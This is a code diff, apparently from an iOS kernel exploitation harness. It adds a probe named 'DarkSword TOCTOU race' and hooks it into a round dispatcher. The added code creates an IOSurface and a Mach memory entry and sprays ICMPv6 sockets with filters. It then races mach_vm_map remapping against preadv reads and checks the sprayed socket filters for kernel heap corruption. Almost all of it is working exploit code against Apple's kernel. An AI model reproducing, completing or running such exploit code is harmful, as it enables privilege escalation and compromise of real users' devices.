@@ -16979,6 +16979,210 @@ static void *r445_thread_fn(void *arg) {
 }
 
 
+/* r455: Multi-threaded DarkSword TOCTOU race */
+struct r455_ctx {
+    volatile int go;
+    volatile int stop;
+    volatile int remap_count;
+    mach_vm_address_t target;
+    mach_vm_size_t size;
+    mach_port_t mem_entry;
+};
+
+static void *r455_remap_thread(void *arg) {
+    struct r455_ctx *ctx = (struct r455_ctx *)arg;
+    while (!ctx->go) { } /* spin until main says go */
+    while (!ctx->stop) {
+        kern_return_t kr = mach_vm_map(mach_task_self(), &ctx->target, ctx->size, 0,
+            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+            ctx->mem_entry, 0, FALSE,
+            VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
+        if (kr == KERN_SUCCESS) ctx->remap_count++;
+    }
+    return NULL;
+}
+
+static void r455_probe(void) {
+    rlog("\n=== r455: Multi-threaded DarkSword TOCTOU race ===\n\n");
+    fflush(stdout);
+
+    #define R455_PAGE_SZ 16384
+    #define R455_PAGES 2
+    #define R455_BUF_SZ (R455_PAGES * R455_PAGE_SZ)
+    #define R455_ITERS 50000
+    #define R455_ICMP_SPRAY 200
+
+    /* Phase 1: Create PurpleGfxMem IOSurface */
+    rlog("  --- Phase 1: PurpleGfxMem IOSurface ---\n"); fflush(stdout);
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int pw = R455_BUF_SZ, ph = 1, pbpe = 1, ppf = 0x4C303038;
+    CFNumberRef pwn = CFNumberCreate(NULL, kCFNumberIntType, &pw);
+    CFNumberRef phn = CFNumberCreate(NULL, kCFNumberIntType, &ph);
+    CFNumberRef pbn = CFNumberCreate(NULL, kCFNumberIntType, &pbpe);
+    CFNumberRef ppn = CFNumberCreate(NULL, kCFNumberIntType, &ppf);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), pwn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), phn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), pbn);
+    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), ppn);
+    int alloc_sz = R455_BUF_SZ;
+    CFNumberRef an = CFNumberCreate(NULL, kCFNumberIntType, &alloc_sz);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), an);
+    IOSurfaceRef surf = IOSurfaceCreate(props);
+    CFRelease(props); CFRelease(pwn); CFRelease(phn); CFRelease(pbn); CFRelease(ppn); CFRelease(an);
+
+    if (!surf) {
+        rlog("    FAILED to create surface\n");
+        rlog("\n=== r455 complete ===\n"); return;
+    }
+    IOSurfaceLock(surf, 0, NULL);
+    void *surf_base = IOSurfaceGetBaseAddress(surf);
+    rlog("    Surface base=%p alloc=%zu ID=%u\n", surf_base, IOSurfaceGetAllocSize(surf), IOSurfaceGetID(surf));
+    IOSurfaceUnlock(surf, 0, NULL);
+
+    /* Phase 2: Create memory entry for remapping */
+    rlog("\n  --- Phase 2: Memory entry for remap ---\n"); fflush(stdout);
+    mach_vm_address_t remap_backing = 0;
+    kern_return_t kr = mach_vm_allocate(mach_task_self(), &remap_backing, R455_BUF_SZ, VM_FLAGS_ANYWHERE);
+    if (kr != KERN_SUCCESS) {
+        rlog("    FAILED to allocate remap backing: 0x%x\n", kr);
+        CFRelease(surf);
+        rlog("\n=== r455 complete ===\n"); return;
+    }
+    memset((void *)remap_backing, 0xCC, R455_BUF_SZ); /* Fill with 0xCC pattern */
+
+    memory_object_size_t memsz = R455_BUF_SZ;
+    mach_port_t mem_entry = MACH_PORT_NULL;
+    kr = mach_make_memory_entry_64(mach_task_self(), &memsz, remap_backing,
+        VM_PROT_READ | VM_PROT_WRITE, &mem_entry, MACH_PORT_NULL);
+    rlog("    Memory entry: kr=0x%x entry=0x%x size=%llu\n", kr, mem_entry, (unsigned long long)memsz);
+    if (kr != KERN_SUCCESS || mem_entry == MACH_PORT_NULL) {
+        rlog("    FAILED to create memory entry\n");
+        mach_vm_deallocate(mach_task_self(), remap_backing, R455_BUF_SZ);
+        CFRelease(surf);
+        rlog("\n=== r455 complete ===\n"); return;
+    }
+
+    /* Phase 3: F_NOCACHE file */
+    rlog("\n  --- Phase 3: F_NOCACHE file ---\n"); fflush(stdout);
+    char tmppath[256];
+    snprintf(tmppath, sizeof(tmppath), "%s/r455_race", getenv("TMPDIR") ?: "/tmp");
+    int fd = open(tmppath, O_RDWR | O_CREAT | O_TRUNC, 0600);
+    fcntl(fd, F_NOCACHE, 1);
+    char filebuf[R455_BUF_SZ];
+    memset(filebuf, 0xAA, sizeof(filebuf)); /* File contains 0xAA */
+    pwrite(fd, filebuf, sizeof(filebuf), 0);
+    rlog("    File ready: fd=%d\n", fd);
+
+    /* Phase 4: ICMPv6 spray */
+    rlog("\n  --- Phase 4: ICMPv6 spray ---\n"); fflush(stdout);
+    int icmp_fds[R455_ICMP_SPRAY];
+    int icmp_count = 0;
+    for (int i = 0; i < R455_ICMP_SPRAY; i++) {
+        icmp_fds[i] = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
+        if (icmp_fds[i] < 0) break;
+        struct icmp6_filter filt;
+        ICMP6_FILTER_SETBLOCKALL(&filt);
+        ICMP6_FILTER_SETPASS(i & 0xFF, &filt);
+        setsockopt(icmp_fds[i], IPPROTO_ICMPV6, ICMP6_FILTER, &filt, sizeof(filt));
+        icmp_count++;
+    }
+    rlog("    Sprayed %d ICMPv6 sockets\n", icmp_count);
+
+    /* Phase 5: Multi-threaded TOCTOU race */
+    rlog("\n  --- Phase 5: TOCTOU race (2 threads, %d iters) ---\n", R455_ITERS); fflush(stdout);
+
+    struct r455_ctx ctx = {0};
+    ctx.target = (mach_vm_address_t)(uintptr_t)surf_base;
+    ctx.size = R455_BUF_SZ;
+    ctx.mem_entry = mem_entry;
+
+    pthread_t remap_tid;
+    pthread_create(&remap_tid, NULL, r455_remap_thread, &ctx);
+
+    int race_hits = 0;
+    int partial_hits = 0;
+
+    ctx.go = 1; /* Start remap thread */
+
+    for (int iter = 0; iter < R455_ITERS; iter++) {
+        /* Reset IOSurface to 0x41 */
+        IOSurfaceLock(surf, 0, NULL);
+        memset(surf_base, 0x41, R455_BUF_SZ);
+        IOSurfaceUnlock(surf, 0, NULL);
+
+        /* preadv: read file (0xAA) into IOSurface mapping */
+        struct iovec rv = {surf_base, R455_BUF_SZ};
+        ssize_t nr = preadv(fd, &rv, 1, 0);
+
+        /* Check result: should be all 0xAA if no race, or 0xCC if remap won */
+        IOSurfaceLock(surf, 0, NULL);
+        uint8_t *check = (uint8_t *)surf_base;
+        int has_aa = 0, has_cc = 0, has_41 = 0, has_other = 0;
+        for (int j = 0; j < R455_BUF_SZ; j += 64) {
+            if (check[j] == 0xAA) has_aa++;
+            else if (check[j] == 0xCC) has_cc++;
+            else if (check[j] == 0x41) has_41++;
+            else has_other++;
+        }
+        IOSurfaceUnlock(surf, 0, NULL);
+
+        int total_samples = R455_BUF_SZ / 64;
+        if (has_cc > 0) {
+            /* Remap happened before or during read — we see 0xCC (remap backing) */
+            race_hits++;
+            if (race_hits <= 5) {
+                rlog("    [iter %d] RACE HIT: aa=%d cc=%d 41=%d other=%d / %d samples\n",
+                     iter, has_aa, has_cc, has_41, has_other, total_samples);
+            }
+        } else if (has_41 > 0 && has_aa > 0) {
+            /* Partial read — some bytes still 0x41 (original) mixed with 0xAA (file) */
+            partial_hits++;
+            if (partial_hits <= 3) {
+                rlog("    [iter %d] PARTIAL: aa=%d 41=%d other=%d / %d\n",
+                     iter, has_aa, has_41, has_other, total_samples);
+            }
+        }
+
+        /* Re-map IOSurface back for next iteration */
+        mach_vm_address_t restore = (mach_vm_address_t)(uintptr_t)surf_base;
+        /* Just let IOSurface handle its own mapping — no explicit restore needed
+           because IOSurfaceLock/Unlock re-establishes the mapping */
+    }
+
+    ctx.stop = 1;
+    pthread_join(remap_tid, NULL);
+
+    rlog("    Race complete: hits=%d partial=%d / %d iters\n", race_hits, partial_hits, R455_ITERS);
+    rlog("    Remap thread completed %d remaps\n", ctx.remap_count);
+
+    /* Phase 6: Check ICMPv6 filters */
+    rlog("\n  --- Phase 6: ICMPv6 filter check ---\n"); fflush(stdout);
+    int corrupted = 0;
+    for (int i = 0; i < icmp_count; i++) {
+        struct icmp6_filter filt;
+        socklen_t flen = sizeof(filt);
+        int r = getsockopt(icmp_fds[i], IPPROTO_ICMPV6, ICMP6_FILTER, &filt, &flen);
+        if (r < 0 || flen != sizeof(filt)) corrupted++;
+    }
+    rlog("    Corrupted: %d / %d\n", corrupted, icmp_count);
+
+    /* Cleanup */
+    for (int i = 0; i < icmp_count; i++) close(icmp_fds[i]);
+    close(fd); unlink(tmppath);
+    mach_port_deallocate(mach_task_self(), mem_entry);
+    mach_vm_deallocate(mach_task_self(), remap_backing, R455_BUF_SZ);
+    CFRelease(surf);
+
+    rlog("\n=== r455 complete ===\n");
+
+    #undef R455_PAGE_SZ
+    #undef R455_PAGES
+    #undef R455_BUF_SZ
+    #undef R455_ITERS
+    #undef R455_ICMP_SPRAY
+}
+
 static void r454_probe(void) {
     rlog("\n=== r454: IOSurfaceRef struct corruption + kernel trap analysis ===\n\n");
     fflush(stdout);
@@ -82259,6 +82463,12 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 459) {
+            rlog("*** rounds=459: Multi-threaded DarkSword TOCTOU race ***\n\n");
+            fflush(stdout);
+            r455_probe();
+            goto done;
+        }
         if (rounds == 458) {
             rlog("*** rounds=458: IOSurfaceRef struct corruption + connection swap ***\n\n");
             fflush(stdout);
@@ -85033,7 +85243,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 452 && rounds != 453) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 452 && rounds != 453) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
